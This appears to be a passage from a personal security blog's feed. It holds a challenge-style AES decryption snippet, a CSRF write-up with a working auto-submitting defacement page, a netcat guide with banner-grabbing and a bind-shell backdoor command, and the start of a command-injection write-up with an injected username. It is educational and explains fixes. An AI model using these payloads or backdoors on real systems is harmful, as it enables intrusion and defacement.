<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">decrypt</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">,</span> <span class="n">String</span> <span class="n">s1</span><span class="o">,</span> <span class="n">String</span> <span class="n">s2</span><span class="o">)</span>
<span class="o">{</span>
    <span class="n">SecretKeySpec</span> <span class="n">secretkeyspec</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">SecretKeySpec</span><span class="o">(</span><span class="n">hexStringToBytes</span><span class="o">(</span><span class="n">s1</span><span class="o">),</span> <span class="s">&quot;AES&quot;</span><span class="o">);</span>
    <span class="n">Cipher</span> <span class="n">cipher</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="kt">byte</span><span class="o">[]</span> <span class="n">key</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&quot;AES/CBC/PKCS5Padding&quot;</span><span class="o">);</span>
        <span class="n">cipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="n">Cipher</span><span class="o">.</span><span class="na">DECRYPT_MODE</span><span class="o">,</span> <span class="n">secretkeyspec</span><span class="o">,</span> <span class="k">new</span> <span class="nf">IvParameterSpec</span><span class="o">(</span><span class="n">s2</span><span class="o">.</span><span class="na">getBytes</span><span class="o">()));</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">hexStringToBytes</span><span class="o">(</span><span class="n">s</span><span class="o">));</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
<span class="o">}</span>

<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[])</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">e</span> <span class="o">=</span> <span class="s">&quot;29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84&quot;</span><span class="o">;</span>
    <span class="n">String</span> <span class="n">iv</span> <span class="o">=</span> <span class="s">&quot;a5efdbd57b84ca36&quot;</span><span class="o">;</span>
    <span class="n">String</span> <span class="n">key</span> <span class="o">=</span> <span class="s">&quot;37eaae0141f1a3adf8a1dee655853714&quot;</span><span class="o">;</span>
    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">decrypt</span><span class="o">(</span><span class="n">e</span><span class="o">,</span> <span class="n">key</span><span class="o">,</span> <span class="n">iv</span><span class="o">));</span>
<span class="o">}</span>
<span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;}</span></code></pre></div></p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>java blah
fl-ag-IS-se-ri-al-NU-MB-ER</code></pre></div></p>

<p>Thanks for reading!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Abusing Admin Privileges via CSRF]]></title>
    <link href="http://blog.mark.lc/blog/2014/09/11/csrf-news/"/>
    <updated>2014-09-11T00:00:00-04:00</updated>
    <id>http://blog.mark.lc/blog/2014/09/11/csrf-news</id>
    <content type="html"><![CDATA[<p><em>Exploiting a classic CSRF vulnerability</em></p>

<p>When I took over responsibility as the webmaster for
<a href="http://www.ieee.neu.edu">Northeastern University&rsquo;s IEEE student chapter</a> around
January 2014 (yes, this is a very belated post), I was suddenly reponsible for
maintaining a custom LAMP stack Content Management System (CMS) whose core
functionality was letting an admin post to a news feed on the front page of the
site.
This site has since been completely redone, but given that it is notoriously
difficult to program securely in PHP, I decided to poke around a little and
see if I could find any cool bugs.</p>

<p>Initially, I started looking for the most blatant web vulns, SQLi and XSS, but
was pleasantly surprised to find in the <code>register.php</code> file, for example, that
handles user registration, to find a input sanitation check.</p>

<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">((</span><span class="nx">isValid</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">newusername</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]))</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;(</span><span class="nx">isValid</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">newpassword</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;])))</span>
<span class="p">{</span>
    <span class="c1">// continue with registration</span>
<span class="p">}</span></code></pre></div></p>

<p>where <code>isValid()</code> looks like</p>

<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">isValid</span><span class="p">(</span><span class="nv">$varx</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$valid</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
    <span class="nv">$bad_stuff</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="c1">#&amp;rdquo;,&amp;ldquo;(&amp;rdquo;,&amp;ldquo;)&amp;rdquo;,&amp;ldquo;&amp;lt;&amp;rdquo;,&amp;ldquo;&gt;&amp;rdquo;,&amp;ldquo;?&amp;rdquo;,&amp;ldquo;/&amp;rdquo;,&amp;ldquo;\&amp;rdquo;,&amp;ldquo;[&amp;rdquo;,&amp;ldquo;]&amp;rdquo;,&amp;ldquo;|&amp;rdquo;,&amp;ldquo;$&amp;rdquo;,&amp;ldquo;&amp;lsquo;&amp;rdquo;,&amp;ldquo;:&amp;rdquo;,&amp;ldquo;;&amp;rdquo;, &amp;ldquo;@&amp;rdquo;);</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$index</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$varx</span><span class="p">);</span> <span class="nv">$index</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$varx</span><span class="p">,</span><span class="nv">$index</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span> <span class="nv">$bad_stuff</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$valid</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$varx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;)</span> <span class="p">{</span>
        <span class="nv">$valid</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$valid</span><span class="p">;</span>
<span class="p">}</span></code></pre></div></p>

<p>This code has a pretty substantial blacklist of commonly used characters in
injections and operates by iterating over each character of the questionable
input and testing if the character is in the blacklist, if so, setting the
<code>$valid</code> variable to false. This seems to be an effective technique at ensuring
the input is safe to use, however OWASP tends to <a href="https://www.owasp.org/index.php/Data_Validation#Data_Validation_Strategies">discourage</a>
this model.</p>

<p>After ruling this out of potential vulns, I looked a little deeper into the code
that powered the posting of news to the website, <code>add-news.php</code>.</p>

<p>Here we can see that if the HTTP request is a &ldquo;POST&rdquo; and the PHP session variables
&ldquo;isadmin&rdquo; and &ldquo;isofficer&rdquo; are set to &ldquo;yessir&rdquo; and &ldquo;true&rdquo; respectively, then
the code that adds news gets executed.</p>

<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SERVER</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">REQUEST_METHOD</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span> <span class="o">==</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">POST</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;)</span>
    <span class="p">{</span>
        <span class="k">include</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ieee</span><span class="o">-</span><span class="nx">lib</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SESSION</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">isadmin</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;])</span> <span class="o">||</span> <span class="nb">isset</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SESSION</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">isofficer</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]))</span>
        <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SESSION</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">isadmin</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span> <span class="o">==</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">yessir</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">isofficer</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span> <span class="o">==</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="k">true</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;)</span>
            <span class="p">{</span>
                <span class="c1">// add news</span></code></pre></div></p>

<p>After these access checks pass, the POST request data is processed and
ultimately a SQL query string is generated.</p>

<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="c1">// continued from above</span>
<span class="nv">$title</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">news_title</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;],</span> <span class="nx">ENT_QUOTES</span><span class="p">);</span>
<span class="nv">$text</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">post</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;],</span> <span class="nx">ENT_QUOTES</span><span class="p">);</span>
<span class="p">{</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="p">}</span> <span class="c1">// some omitted stuff</span>
<span class="nv">$user_query</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="nx">user_id</span><span class="p">,</span> <span class="nx">username</span> <span class="nx">FROM</span> <span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span> <span class="o">.</span> <span class="nv">$INFO</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">sql_prefix</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span> <span class="o">.</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">users</span> <span class="nx">WHERE</span> <span class="nx">username</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span> <span class="o">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&amp;rsquo;] . &amp;ldquo;&amp;lsquo;&amp;rdquo;;</span>
<span class="s1">$user_result = mysql_query($user_query);</span>
<span class="s1">if($user_result)</span>
<span class="s1">{</span>
<span class="s1">    //Returns an array with the data from the SQL select statement</span>
<span class="s1">    $user_row = mysql_fetch_row($user_result);&lt;/p&gt;</span>

<span class="s1">&lt;pre&gt;&lt;code&gt;$query1 = &quot;INSERT INTO &quot; . $INFO[&#39;</span><span class="nx">sql_prefix</span><span class="s1">&#39;] . &quot;news (news_title, news_type, time_posted, time_meeting, news_body, author_id, author_name, meeting_location) &quot;;</span>
<span class="s1">$query2 = &quot;VALUES (&#39;</span><span class="s2">&quot; . </span><span class="si">$title</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$type_of_news</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . time() . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$time_of_meeting</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$text</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$user_row[0]</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$user_row[1]</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$meetinglocation</span><span class="s2"> . &quot;</span><span class="s1">&#39;)&quot;;</span>
<span class="s1">$add_news_query = $query1 . $query2;</span>
<span class="s1">$add_news_result = mysql_query($add_news_query);</span>

<span class="s1">if($add_news_result)</span>
<span class="s1">{</span>
<span class="s1">    header(&#39;</span><span class="nx">Location</span><span class="o">:</span> <span class="nx">http</span><span class="o">://</span><span class="nx">www</span><span class="o">.</span><span class="nx">ieee</span><span class="o">.</span><span class="nx">neu</span><span class="o">.</span><span class="nx">edu</span><span class="o">/?</span><span class="nx">page</span><span class="o">=</span><span class="nx">addnews</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span><span class="nx">success</span><span class="o">=</span><span class="k">true</span><span class="s1">&#39;);</span>
<span class="s1">}</span>
<span class="s1">else</span>
<span class="s1">{</span>
<span class="s1">    header(&#39;</span><span class="nx">Location</span><span class="o">:</span> <span class="nx">http</span><span class="o">://</span><span class="nx">www</span><span class="o">.</span><span class="nx">ieee</span><span class="o">.</span><span class="nx">neu</span><span class="o">.</span><span class="nx">edu</span><span class="o">/?</span><span class="nx">page</span><span class="o">=</span><span class="nx">addnews</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span><span class="nx">error</span><span class="o">=</span><span class="nx">unable_to_post_news</span><span class="err">&#39;</span><span class="p">);</span>
<span class="p">}</span>
<span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="p">}</span>
<span class="c1">// done</span></code></pre></div></p>

<p>The important part to notice here is that there is no code that ensures the
legitimacy of the request, that is, that a currently authenticated admin
user actually meant to make this request. In this scenario if we can somehow
find a way to get the admin to
submit an arbitrary POST request to the <code>add-news.php</code> page, since she already
has the session all set up in her browser, we can bypass the session checks
previously shown and add arbitrary news to the website, for example.</p>

<p>You might be wondering how we can get the admin to submit arbitrary POST requests
without her noticing. The most obvious answer is physical access to the her
machine while she&rsquo;s away or something, but a much more realistic scenario
would be if we would get the admin
to browse to a web page that we (the attacker) control, we can use some nifty
JavaScript magic to get her to automatically submit the proper POST request
on our behalf.</p>

<p>This is called <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF">Cross Site Request Forgery</a>).</p>

<p>It turns out that these types of malicious pages are actually very simple
to write. Remember, all that&rsquo;s really needed is JavaScript execution, so
for example if you had previous knowledge of a site that the admin frequented
that had an XSS vulnerability, that would be a perfect way to chain these attacks.
Anyway, here&rsquo;s an example malicious page <sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>.</p>

<p><div class="highlight"><pre><code class="language-html" data-lang="html"><span class="ni">&amp;lt;</span>!DOCTYPE HTML&gt;
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;h1&gt;</span>non-malicious website! :)<span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">&quot;thisform&quot;</span> <span class="na">action=</span><span class="s">&quot;http://www.ieee.neu.edu/add-news.php&quot;</span> <span class="na">method=</span><span class="s">&quot;POST&quot;</span>
          <span class="na">style=</span><span class="s">&quot;display:none;&quot;</span><span class="nt">&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;news_title&quot;</span> <span class="na">value=</span><span class="s">&quot;breaking news: u got hacked&quot;</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;post&quot;</span> <span class="na">value=</span><span class="s">&quot;insert website defacement here&quot;</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">charset=</span><span class="s">&quot;utf-8&quot;</span><span class="nt">&gt;</span>
        <span class="kd">var</span> <span class="nx">frm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">thisform</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
        <span class="nx">frm</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span>
    <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></div></p>

<p>Nothing fancy here, just a simple hidden form with the values you want to submit
to the page, and some JS that submits the form.</p>

<p>A caveat: Yes, it is true that you would
have to guess the proper field names (&ldquo;posts&rdquo;, &ldquo;news_title&rdquo;) but even if you can
only guess &ldquo;posts&rdquo;, you can write anything into the body of the news post.</p>

<p>End result looks something like this.</p>

<p><img src="/images/ieee_csrf.gif" alt="" /></p>

<p>There was an identical bug in the code that handles editing users. Let&rsquo;s
have some fun!</p>

<p><img src="/images/ieee_csrf2.gif" alt="" /></p>

<p>In both of these gifs, the admin user was logged in, and then they opened
a malicious html file, simulating visiting a malicious website. The mere act of
opening the web page triggered the payload which sent the POST to the server,
adding the news, and changing the user.</p>

<p>So how do we fix this sort of thing? The most common way involves the server
requiring a randomly generated, non-predictable token that is associated with
the user session with each request. An example could be that every time the
actual admin web interface form is loaded, it contains a hidden field, invisible
to the admin, with this token that is sent along with the request. The server
verifies that it sent this token out previously, and that the token hasn&rsquo;t expired,
and if everything else checks out, the request goes through.
This crucial missing piece of information will prevent attackers from
successfully faking requests as the authenticated user.</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>For more examples of how to trigger your CSRF payload via JavaScript, check out the excellent <a href="http://edgeguides.rubyonrails.org/security.html#cross-site-request-forgery-csrf">Ruby on Rails Security Guide</a><a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Netcat Refresher]]></title>
    <link href="http://blog.mark.lc/blog/2014/03/05/netcat/"/>
    <updated>2014-03-05T00:00:00-05:00</updated>
    <id>http://blog.mark.lc/blog/2014/03/05/netcat</id>
    <content type="html"><![CDATA[<p><em>Quick overview of the legendary Unix tool, netcat, with examples and applications</em></p>

<h2>Introduction</h2>

<p><a href="https://en.wikipedia.org/wiki/Netcat">Netcat</a> is a great tool for all things networking and is commonly nicknamed &ldquo;the TCP/IP Swiss-army knife&rdquo; due to its versatility and utility. An absolute must-know for sysadmins and hackers. In this article, I&rsquo;ll go over a few common uses I have for it that I frequently forget after not using it for a while, primarily for my own personal reference.</p>

<p>Before I begin, I should point out that there are a few variants on netcat that have slightly different options and behaviors but are all essentially the same in &ldquo;spirit and functionality&rdquo;, as the <a href="http://nmap.org/ncat/">ncat</a> man page describes it.</p>

<p>The original netcat comes from the OpenBSD package and was written by &ldquo;Hobbit&rdquo;. This is the default version that comes with OS X and Ubuntu. The version that I use and will cover is the standard GNU Netcat, by Giovanni Giacobbi, which is a rewrite of the original. This available using <a href="http://brew.sh">brew</a> on OS X. On Ubuntu it&rsquo;s called &ldquo;netcat-traditional&rdquo; which you can <code>apt-get</code> and then run with <code>nc.traditional</code>. Lastly, there is <a href="http://nmap.org/ncat">ncat</a>, which is a netcat implementation by our friends from the <a href="http://nmap.org">nmap</a> team. It is designed to modernize netcat and adds features like SSL, IPv6, and proxying which aren&rsquo;t available in the original(s).</p>

<h2>Usage</h2>

<p>At its core, netcat is a tool for creating arbitrary TCP connections, which looks like</p>

<pre><code>$ netcat [host] [port]
</code></pre>

<p>where host is either an IP Address or a domain name, and port is the TCP port to connect to.</p>

<p>You can also use netcat to do the reverse: listen for arbitrary TCP connections. This looks like</p>

<pre><code>$ netcat -l -p [port] [host]
</code></pre>

<p>Here, host is an optional parameter which lets you limit what host can create connections.</p>

<h4>Example: Chat</h4>

<p>Using these two behaviors, we can create a crude chat system. One one host, listen for connections on a port.</p>

<pre><code>$ netcat -l -p 1337
</code></pre>

<p>On the same one, in another terminal, connect to it on that port.</p>

<pre><code>$ nc localhost 1337
</code></pre>

<p>There won&rsquo;t be a prompt, but when you enter text and press enter, it will appear in the other terminal. You can just as easily do this between different hosts and have a super basic chat setup.</p>

<p><img src="https://draftin.com:443/images/12181?token=V4hz4Qtwi_uM_-4ulkErwUudxL_qY8D2yxx-fPjLSffSc8-FV0FOVRlvd4psBi-fLricHlJLjufBWr6E91R_spQ" alt="" /></p>

<h3>Example: Curl-like behavior</h3>

<p>You can also use netcat to emulate curl and interact with HTTP servers. Connect to the server on port 80 (or whatever port it&rsquo;s running on) and you can then type out the HTTP request to send to it. When you&rsquo;re finished, hit enter twice and it will send.</p>

<pre><code>[mark:~]{ nc example.org 80
GET / HTTP/1.1

HTTP/1.1 400 Bad Request
Content-Type: text/html
Content-Length: 349
Connection: close
Date: Wed, 05 Mar 2014 20:15:42 GMT
Server: ECSF (mdw/1383)

&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"&gt;
&lt;head&gt;
&lt;title&gt;400 - Bad Request&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;400 - Bad Request&lt;/h1&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>As you can see here, we sent a bare-bones HTTP request (<code>GET / HTTP/1.1</code>) which was successfully sent to the server. The server responded with a 400, because our request didn&rsquo;t contain enough information, but that&rsquo;s not important; if we had filled in the right headers, it would have responded with the home page for example.org.</p>

<h2>For Hackers</h2>

<p>There are two applications for netcat that I find particularly useful in pen-testing situations.</p>

<h3>Recon</h3>

<p>The first is helpful for the recon stage, which is essentially getting information on your target. Sometimes network services may give away version information when an arbitrary network connection is made. For example, OpenSSH by default gives away it&rsquo;s version information as well as information on the host, when you connect. For example,</p>

<pre><code>$ netcat 1.2.3.4 22
SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.1
</code></pre>

<p>is typically what you might see. For an attacker, this is pretty valuable stuff! MySQL behaves similarly.</p>

<pre><code>$ netcat 1.2.3.4 3306
J
5.5.33-.?2|&gt;\8��@x\E$"zeic2lmysql_native_password
</code></pre>

<p>The output isn&rsquo;t as clear as OpenSSH, but we can confirm that MySQL is indeed running, and we can infer that the version is &ldquo;5.5.33&rdquo;. For information on removing these banners, check out my <a href="http://blog.mark.lc/banner">blog post</a> on it.</p>

<h3>Persistence/Access</h3>

<p>The other application is when you have achieved command execution, but not exactly shell access. You can use netcat to create a nifty backdoor which you can externally connect to. To create the backdoor, we&rsquo;ll use the <code>-e</code> flag to tell netcat to execute a binary on receiving a connection. We want a shell, so we&rsquo;ll say <code>-e /bin/sh</code>. The whole command will look like:</p>

<pre><code>$ netcat -l -p 1337 -e /bin/sh
</code></pre>

<p>which will give you a backdoor on port 1337, which will then let you run commands upon connecting to that port. For a good example, check out my other <a href="http://blog.mark.lc/ihackedit">blog post</a> where I actually used this.</p>

<h2>Conclusion</h2>

<p>That was a quick overview of netcat including its basic functionality and some example use cases. Thanks for reading!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[iHackedIT]]></title>
    <link href="http://blog.mark.lc/blog/2014/03/01/ihackedit/"/>
    <updated>2014-03-01T14:00:00-05:00</updated>
    <id>http://blog.mark.lc/blog/2014/03/01/ihackedit</id>
    <content type="html"><![CDATA[<p><em>Discovering, patching, and exploiting a simple command injection webapp</em></p>

<h2>Introduction</h2>

<p>The university that I study at, <a href="http://neu.edu">Northeastern</a> has an awesome <a href="http://www.northeastern.edu/entrepreneurs/">Entrepreneurs Club</a>. One of the programs that they run is called <a href="http://www.northeastern.edu/entrepreneurs/programs/imadeit/">iMadeIT</a> which is a series of workshops designed to help entrepreneurs with a nontechnical background to learn about web development. This post is going go over a vulnerability I discovered in the iMadeIT class website, how I patched, and how an attacker might exploit it in a real situation.</p>

<h2>Background</h2>

<p>The workshops are taught using <a href="http://flask.pocoo.org/">Flask</a>, a Python microframework for web development known for its simplicity and ease of use for beginners. Students taking the class would sign up at <a href="http://imadeit.nu">imadeit.nu</a>, which would make them an account on the website for class management purposes, but also would interestingly create an account for them on the server running the iMadeIT site as well as allow them to &ldquo;register&rdquo; a TCP port to run their Flask app on. This would allow students to have a live link on the internet so they could show off what they&rsquo;ve been working on to people (instead of just running on localhost) without requiring everyone to have their own server.</p>

<h2>The Vulnerability</h2>

<p>Anyway, the iMadeIT guys open sourced the <a href="https://github.com/imadeitnortheastern/spring2014">code</a> that runs their imadeit.nu website and since it is actually written in Flask which is something I&rsquo;ve been meaning to learn for a while now, I decided to take a look at it to see if I could understand anything.</p>

<p>After poking around in the code for a bit, I noticed this particularly interesting function:</p>

<pre><code class="python">def create(name, password):
    {...}
    return os.system('useradd -p {} -s /bin/bash -d /home/{} -m {}'.format(enc_pass, name, name))
</code></pre>

<p>This is what gives the user their own account on the server. If we trace the function calls, we can see that this function is called from the <code>create_account</code> function. Heavily edited to only show relevant sections, it looks like this:</p>

<pre><code class="python">def create_account():
    {...}
    name = request.form['create_username']
    pw = request.form['create_pw']
    {...}
    user.create(name, pw)
    {...}
</code></pre>

<p>Notice anything? The username is taken from the webpage form and directly passed into the <code>create</code> function without any type of sanitization, creating a classic <a href="https://www.owasp.org/index.php/Command_Injection">command injection</a> vulnerability. What this essentially means is that it&rsquo;s possible for an attacker to put a specially formatted string in the username field that will allow them to execute arbitrary commands on the server.</p>

<p>For example, under ordinary circumstances, a user might enter &ldquo;mark&rdquo; as their username, so the <code>os.system()</code> call would execute:</p>

<pre><code class="sh">useradd -p {encrypted password} -s /bin/bash -d /home/mark -m mark
</code></pre>

<p>Let&rsquo;s say a user entered &ldquo;mark; ls -l #&rdquo;. Now, <code>os.system()</code> is going to execute:</p>

<pre><code class="sh">useradd -p {encrypted password} -s /bin/bash -d /home/mark; ls -l; # -m mark; ls -l #
</code></pre>

